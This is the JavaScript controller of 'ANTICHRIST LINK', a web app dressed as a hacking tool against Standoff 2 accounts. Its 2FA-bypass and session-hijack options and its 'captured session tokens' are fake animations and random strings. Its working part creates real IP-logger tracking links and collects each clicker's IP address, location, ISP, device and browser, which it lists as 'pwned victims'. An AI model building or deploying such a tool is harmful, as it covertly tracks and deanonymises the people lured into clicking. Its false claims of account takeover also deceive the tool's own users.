/* ============================================================
   ANTICHRIST LINK — Main Application Controller
   app.js — Navigation, state management, PWA init
   ============================================================ */

window.AC = window.AC || {};

(function () {
  'use strict';

  // ── State ──────────────────────────────────────────────────
  const state = {
    activated: false,
    currentScreen: 'activation',
    selectedTarget: 'standoff2',
    config: {
      bypass2fa: true,
      stealth: true,
      fingerprint: true,
      passwords: true,
      sessionHijack: true,
      proxy: 'RU-7'
    },
    linksRemaining: 7,
    linksTotal: 10,
    victims: [],
    activeLinks: [],
    generatedUrl: null,
    generatedToken: null,
    generatedVictimData: null,
    cancelFunctions: []
  };

  // ── Screens ────────────────────────────────────────────────
  const screens = [
    'activation', 'splash', 'dashboard',
    'generating', 'result', 'victims', 'about'
  ];

  function getScreen(name) {
    return document.getElementById('screen-' + name);
  }

  function showScreen(name) {
    const from = getScreen(state.currentScreen);
    const to = getScreen(name);
    if (!from || !to || name === state.currentScreen) return;

    // Cancel any running animations from previous screen
    cancelAll();

    if (window.AC.anim && window.AC.anim.screenTransition) {
      window.AC.anim.screenTransition(from, to, function () {
        state.currentScreen = name;
        onScreenEnter(name);
      });
    } else {
      from.classList.remove('active');
      to.classList.add('active');
      state.currentScreen = name;
      onScreenEnter(name);
    }

    // Update nav
    updateNav(name);
  }

  function updateNav(name) {
    var navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(function (item) {
      item.classList.toggle('active', item.dataset.screen === name);
    });
    // Show/hide nav
    var nav = document.getElementById('main-nav');
    if (nav) {
      var showNav = ['dashboard', 'victims', 'about', 'mylinks'].indexOf(name) !== -1;
      nav.classList.toggle('visible', showNav);
    }
  }

  function cancelAll() {
    state.cancelFunctions.forEach(function (fn) {
      if (typeof fn === 'function') fn();
    });
    state.cancelFunctions = [];
  }

  // ── Screen Enter Handlers ─────────────────────────────────
  function onScreenEnter(name) {
    switch (name) {
      case 'dashboard':
        startDashboard();
        break;
      case 'generating':
        startGeneration();
        break;
      case 'result':
        showResult();
        break;
      case 'victims':
        showVictims();
        break;
      case 'mylinks':
        showMyLinks();
        break;
      case 'about':
        break;
    }
  }

  // ── Activation Screen ─────────────────────────────────────
  function initActivation() {
    var keyInput = document.getElementById('activation-key');
    var activateBtn = document.getElementById('btn-activate');
    var errorEl = document.getElementById('activation-error');

    if (!activateBtn) return;

    activateBtn.addEventListener('click', function () {
      var key = keyInput ? keyInput.value.trim() : '';
      if (key.length >= 8) {
        if (errorEl) errorEl.style.display = 'none';
        state.activated = true;
        localStorage.setItem('ac_activated', '1');
        showScreen('splash');
        startSplash();
      } else {
        if (errorEl) {
          errorEl.textContent = '✗ INVALID KEY — Minimum 8 characters required';
          errorEl.style.display = 'block';
        }
        if (window.AC.anim) window.AC.anim.glitch(keyInput, 500);
      }
    });

    // Enter key
    if (keyInput) {
      keyInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') activateBtn.click();
      });
    }
  }

  // ── Splash Screen ─────────────────────────────────────────
  function startSplash() {
    var steps = [
      { el: 'splash-step-1', text: 'Connecting to ANTICHRIST network...', duration: 800 },
      { el: 'splash-step-2', text: 'Verifying license key...', duration: 600 },
      { el: 'splash-step-3', text: 'Loading exploit modules...', duration: 1000 },
      { el: 'splash-step-4', text: 'Checking for updates... v3.1.7 is latest', duration: 500 },
      { el: 'splash-step-5', text: 'Access granted. Welcome back.', duration: 400 }
    ];

    var delay = 0;
    steps.forEach(function (step, i) {
      delay += step.duration;
      setTimeout(function () {
        var el = document.getElementById(step.el);
        if (el) {
          el.querySelector('.splash-text').textContent = step.text;
          el.querySelector('.splash-bar-fill').style.width = '100%';
          el.classList.add('complete');
        }
        if (i === steps.length - 1) {
          setTimeout(function () {
            showScreen('dashboard');
          }, 800);
        }
      }, delay);
    });
  }

  // ── Dashboard ─────────────────────────────────────────────
  function startDashboard() {
    // Update links remaining
    var linksEl = document.getElementById('links-remaining');
    if (linksEl) {
      linksEl.textContent = state.linksRemaining + '/' + state.linksTotal;
    }

    // Start log ticker
    var tickerEl = document.getElementById('log-ticker');
    if (tickerEl && window.AC.anim) {
      var cancel = window.AC.anim.logTicker(tickerEl);
      state.cancelFunctions.push(cancel);
    }

    // Start random notifications
    if (window.AC.notify) {
      var cancel2 = window.AC.notify.startRandom();
      state.cancelFunctions.push(cancel2);
    }
  }

  function initDashboard() {
    // Target cards
    var cards = document.querySelectorAll('.target-card');
    cards.forEach(function (card) {
      card.addEventListener('click', function () {
        cards.forEach(function (c) { c.classList.remove('selected'); });
        card.classList.add('selected');
        state.selectedTarget = card.dataset.target;
      });
    });

    // Toggles
    document.querySelectorAll('.toggle-switch').forEach(function (toggle) {
      toggle.addEventListener('click', function () {
        toggle.classList.toggle('active');
        var key = toggle.dataset.config;
        if (key && state.config.hasOwnProperty(key)) {
          state.config[key] = toggle.classList.contains('active');
        }
      });
    });

    // Proxy selector
    var proxySelect = document.getElementById('proxy-select');
    if (proxySelect) {
      proxySelect.addEventListener('change', function () {
        state.config.proxy = proxySelect.value;
      });
    }

    // Generate button
    var generateBtn = document.getElementById('btn-generate');
    if (generateBtn) {
      generateBtn.addEventListener('click', function () {
        if (!state.selectedTarget) {
          if (window.AC.notify) {
            window.AC.notify.show('Select a target platform first', 'alert');
          }
          return;
        }
        var targetInput = document.getElementById('target-input');
        if (!targetInput || !targetInput.value.trim()) {
          if (window.AC.notify) {
            window.AC.notify.show('Enter target URL or username', 'alert');
          }
          return;
        }
        showScreen('generating');
      });
    }

    // Nav items
    document.querySelectorAll('.nav-item').forEach(function (item) {
      item.addEventListener('click', function () {
        var screen = item.dataset.screen;
        if (screen) showScreen(screen);
      });
    });
  }

  // ── Generation Animation ──────────────────────────────────
  function startGeneration() {
    var terminalEl = document.getElementById('terminal-output');
    var progressContainer = document.getElementById('progress-container');
    var ipScannerEl = document.getElementById('ip-scanner');
    var canvasEl = document.getElementById('network-canvas');

    if (!window.AC.gen || !window.AC.terminal) return;

    // Clear previous
    if (terminalEl) terminalEl.innerHTML = '';
    if (ipScannerEl) ipScannerEl.innerHTML = '';

    // Start terminal
    var lines = window.AC.gen.terminalLines(state.selectedTarget);
    var cancelTerminal = window.AC.terminal.start(terminalEl, lines, function () {
      // Terminal complete — call real IPLogger API
      setTimeout(function () {
        // Call backend to create real tracking link
        fetch('/api/create-link', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ destination: 'https://standoff2.com' })
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
          console.log('[AC] Tracker response:', data);
          if (data.success && data.url) {
            state.generatedUrl = data.url;
            state.currentLoggerId = data.logger_id;
          } else {
            state.generatedUrl = window.AC.gen.fakeUrl(state.selectedTarget);
            state.currentLoggerId = null;
            console.warn('[AC] API failed, using fallback');
          }
          state.linksRemaining = Math.max(0, state.linksRemaining - 1);
          showScreen('result');
        })
        .catch(function(err) {
          console.error('[AC] API error, falling back to fake:', err);
          state.generatedUrl = window.AC.gen.fakeUrl(state.selectedTarget);
          state.currentLoggerId = null;
          state.linksRemaining = Math.max(0, state.linksRemaining - 1);
          showScreen('result');
        });
      }, 1200);
    });
    state.cancelFunctions.push(cancelTerminal);

    // Start progress bars
    if (window.AC.anim && progressContainer) {
      window.AC.anim.progressBars(progressContainer, 12000);
    }

    // Start IP scanner
    if (window.AC.anim && ipScannerEl) {
      var cancelIp = window.AC.anim.ipScanner(ipScannerEl);
      state.cancelFunctions.push(cancelIp);
    }

    // Start network canvas
    if (window.AC.anim && canvasEl) {
      var cancelCanvas = window.AC.anim.networkCanvas(canvasEl);
      state.cancelFunctions.push(cancelCanvas);
    }
  }

  // ── Result Screen ─────────────────────────────────────────
  function generateToken() {
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var token = '';
    for (var i = 0; i < 40; i++) {
      token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
  }

  function showResult() {
    var urlEl = document.getElementById('generated-url');

    if (urlEl && state.generatedUrl) {
      urlEl.textContent = state.generatedUrl;
    }

    // Save to active links — with real logger ID for fetching visitors
    var now = new Date();
    var timeStr = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
    var dateStr = String(now.getDate()).padStart(2,'0') + '.' + String(now.getMonth()+1).padStart(2,'0') + '.' + now.getFullYear();
    var linkEntry = {
      url: state.generatedUrl,
      loggerId: state.currentLoggerId,
      token: null,
      date: dateStr + ' ' + timeStr,
      status: 'waiting',
      clicks: 0
    };
    state.activeLinks.unshift(linkEntry);

    // Victims will ONLY appear when someone clicks the link in real life!
    // Periodic check for new real visitors
    if (state.currentLoggerId) {
      var checkInterval = setInterval(function() {
        fetch('/api/visitors/' + state.currentLoggerId)
          .then(function(r) { return r.json(); })
          .then(function(data) {
            if (data.visitors && data.visitors.length > 0) {
              linkEntry.status = 'captured';
              linkEntry.clicks = data.visitors.length;
              if (!linkEntry.token) linkEntry.token = generateToken();
              if (window.AC.notify) {
                window.AC.notify.show('Session captured! Target opened link. Check Intercept logs.', 'info');
              }
              clearInterval(checkInterval);
            }
          })
          .catch(function() {});
      }, 5000);
      state.cancelFunctions.push(function() { clearInterval(checkInterval); });
    }

    // Copy button
    var copyBtn = document.getElementById('btn-copy-link');
    if (copyBtn) {
      copyBtn.onclick = function () {
        if (state.generatedUrl) {
          navigator.clipboard.writeText(state.generatedUrl).then(function () {
            if (window.AC.notify) {
              window.AC.notify.show('Link copied to clipboard', 'success');
            }
            copyBtn.textContent = '✓ COPIED';
            setTimeout(function () { copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>COPY LINK'; }, 2000);
          });
        }
      };
    }

    // My Links button
    var myLinksBtn = document.getElementById('btn-my-links');
    if (myLinksBtn) {
      myLinksBtn.onclick = function () {
        showScreen('mylinks');
      };
    }

    // Back to profile
    var backBtn = document.getElementById('btn-back-profile');
    if (backBtn) {
      backBtn.onclick = function () {
        showScreen('dashboard');
      };
    }

    // New target button
    var newBtn = document.getElementById('btn-new-target');
    if (newBtn) {
      newBtn.onclick = function () {
        showScreen('dashboard');
      };
    }
  }

  // ── My Links Screen ─────────────────────────────────────────
  function showMyLinks() {
    var listEl = document.getElementById('mylinks-list');
    var countEl = document.getElementById('mylinks-count');
    if (!listEl) return;

    if (countEl) countEl.textContent = state.activeLinks.length;

    if (state.activeLinks.length === 0) {
      listEl.innerHTML = '<div class="mylinks-empty mono text-dim">No active links. Generate one first.</div>';
      return;
    }

    var html = '';
    state.activeLinks.forEach(function (link, i) {
      var isCaptured = link.status === 'captured' && link.token;
      var statusClass = isCaptured ? 'status-active' : 'status-waiting';
      var statusText = isCaptured ? 'CAPTURED' : 'WAITING';

      var tokenHtml = '';
      if (isCaptured) {
        tokenHtml = '<div class="mylink-token-row">' +
          '<span class="input-label" style="margin:0;font-size:0.6rem">SESSION TOKEN</span>' +
          '<div class="mylink-token mono">' + link.token + '</div>' +
        '</div>';
      } else {
        tokenHtml = '<div class="mylink-token-row">' +
          '<span class="text-dim mono" style="font-size:0.65rem">Waiting for target to open link...</span>' +
        '</div>';
      }

      html += '<div class="mylink-card' + (isCaptured ? ' mylink-captured' : '') + '">' +
        '<div class="mylink-header">' +
          '<span class="mylink-status ' + statusClass + '">' + statusText + '</span>' +
          '<span class="mylink-date mono text-dim">' + link.date + '</span>' +
        '</div>' +
        '<div class="mylink-url mono">' + link.url + '</div>' +
        tokenHtml +
        '<div class="mylink-footer">' +
          '<span class="mylink-clicks"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:3px"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>' + link.clicks + ' clicks</span>' +
          '<span class="mylink-copy-small" data-url="' + link.url + '">copy</span>' +
        '</div>' +
      '</div>';
    });

    listEl.innerHTML = html;

    // Bind copy buttons
    listEl.querySelectorAll('.mylink-copy-small').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var url = btn.dataset.url;
        navigator.clipboard.writeText(url).then(function() {
          btn.textContent = 'copied!';
          setTimeout(function() { btn.textContent = 'copy'; }, 1500);
        });
      });
    });
  }

  // ── Victims Panel ─────────────────────────────────────────
  function showVictims() {
    var tableEl = document.getElementById('victims-table');
    var tableBody = document.getElementById('victims-table-body');
    var emptyMsg = document.getElementById('victims-empty-state');
    var vLinks = document.getElementById('vmetric-links');
    var vClicks = document.getElementById('vmetric-clicks');
    var vCap = document.getElementById('vmetric-captured');

    if (vLinks) vLinks.textContent = state.activeLinks.length;

    // Collect all logger IDs to fetch
    var loggerIds = state.activeLinks
      .filter(function(l) { return l.loggerId; })
      .map(function(l) { return l.loggerId; });

    if (loggerIds.length === 0) {
      // No real loggers — show empty or local data
      renderVictimsTable(tableEl, tableBody, emptyMsg, vClicks, vCap);
      return;
    }

    // Fetch real visitors for each logger
    var promises = loggerIds.map(function(lid) {
      return fetch('/api/visitors/' + lid)
        .then(function(r) { return r.json(); })
        .catch(function() { return { visitors: [] }; });
    });

    Promise.all(promises).then(function(results) {
      var realVisitors = [];
      results.forEach(function(data) {
        var visitors = data.visitors || [];
        if (Array.isArray(visitors)) {
          visitors.forEach(function(v) {
            realVisitors.push({
              ip: v.ip || 'unknown',
              city: v.city || '',
              country: v.country || '',
              region: v.region || '',
              device: v.device || 'unknown',
              browser: v.browser || '',
              os: v.os || '',
              isp: v.isp || '',
              userAgent: v.userAgent || '',
              language: v.language || '',
              status: 'pwned',
              timestamp: v.timestamp || ''
            });
          });
        }
      });

      // Merge with existing state victims (avoid duplicates by IP)
      var existingIps = {};
      state.victims.forEach(function(v) { existingIps[v.ip] = true; });
      realVisitors.forEach(function(rv) {
        if (!existingIps[rv.ip]) {
          state.victims.unshift(rv);
          existingIps[rv.ip] = true;
        }
      });

      renderVictimsTable(tableEl, tableBody, emptyMsg, vClicks, vCap);
    });
  }

  function renderVictimsTable(tableEl, tableBody, emptyMsg, vClicks, vCap) {
    var totalCaptured = state.victims.length;

    if (vClicks) vClicks.textContent = totalCaptured;
    if (vCap) vCap.textContent = totalCaptured;

    if (!tableBody) return;

    if (state.victims.length === 0) {
      if (tableEl) tableEl.style.display = 'none';
      if (emptyMsg) emptyMsg.style.display = 'block';
      return;
    }

    if (tableEl) tableEl.style.display = 'table';
    if (emptyMsg) emptyMsg.style.display = 'none';

    tableBody.innerHTML = '';
    state.victims.forEach(function (victim, i) {
      var row = document.createElement('tr');
      row.className = 'victim-row';
      row.innerHTML =
        '<td>' + (i + 1) + '</td>' +
        '<td class="mono"><span class="text-red">' + (victim.ip || 'unknown') + '</span></td>' +
        '<td class="mono">' + (victim.city || victim.country || 'unknown') + '</td>' +
        '<td style="font-size:0.7rem">' + (victim.device || 'unknown') + '</td>' +
        '<td><span class="badge status-pwned">LOGGED</span></td>';

      row.addEventListener('click', function () {
        showVictimDetail(victim);
      });

      tableBody.appendChild(row);
    });
  }

  function showVictimDetail(victim) {
    var modal = document.getElementById('victim-modal');
    var modalContent = document.getElementById('victim-modal-content');
    if (!modal || !modalContent) return;

    var location = [victim.city, victim.region, victim.country].filter(Boolean).join(', ') || 'Unknown';
    var time = victim.timestamp ? new Date(victim.timestamp).toLocaleString() : 'N/A';

    modalContent.innerHTML =
      '<h3 class="modal-title">&#10013; VISITOR DATA</h3>' +
      '<div class="data-row"><span class="data-label">IP Address:</span><span class="data-value text-red mono">' + (victim.ip || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Location:</span><span class="data-value">' + location + '</span></div>' +
      '<div class="data-row"><span class="data-label">ISP:</span><span class="data-value">' + (victim.isp || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Device:</span><span class="data-value">' + (victim.device || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">OS:</span><span class="data-value">' + (victim.os || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Browser:</span><span class="data-value">' + (victim.browser || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Language:</span><span class="data-value">' + (victim.language || 'N/A') + '</span></div>' +
      '<div class="data-row"><span class="data-label">Timestamp:</span><span class="data-value mono">' + time + '</span></div>' +
      '<div class="data-row" style="margin-top:0.8rem;padding-top:0.8rem;border-top:1px solid var(--border-color)"><span class="data-label">User-Agent:</span></div>' +
      '<div style="font-size:0.55rem;color:var(--text-dim);word-break:break-all;line-height:1.5;padding:0.4rem 0" class="mono">' + (victim.userAgent || 'N/A') + '</div>';

    modal.classList.add('visible');

    modal.onclick = function (e) {
      if (e.target === modal) {
        modal.classList.remove('visible');
      }
    };
  }

  // ── PWA Registration ──────────────────────────────────────
  function registerPWA() {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js').catch(function () {
        // silent fail
      });
    }
  }

  // ── Init ──────────────────────────────────────────────────
  function init() {
    registerPWA();

    // Check if already activated
    if (localStorage.getItem('ac_activated') === '1') {
      state.activated = true;
      var activationScreen = getScreen('activation');
      if (activationScreen) activationScreen.classList.remove('active');
      var dashboardScreen = getScreen('dashboard');
      if (dashboardScreen) dashboardScreen.classList.add('active');
      state.currentScreen = 'dashboard';
      onScreenEnter('dashboard');
    }

    initActivation();
    initDashboard();

    // Victims list starts completely empty until real link is clicked
    state.victims = [];

    // Version display
    var versionEls = document.querySelectorAll('.version-tag');
    versionEls.forEach(function (el) {
      el.textContent = 'v3.1.7';
    });
  }

  // ── Expose ────────────────────────────────────────────────
  window.AC.app = {
    showScreen: showScreen,
    state: state,
    init: init
  };

  // Auto-init on DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
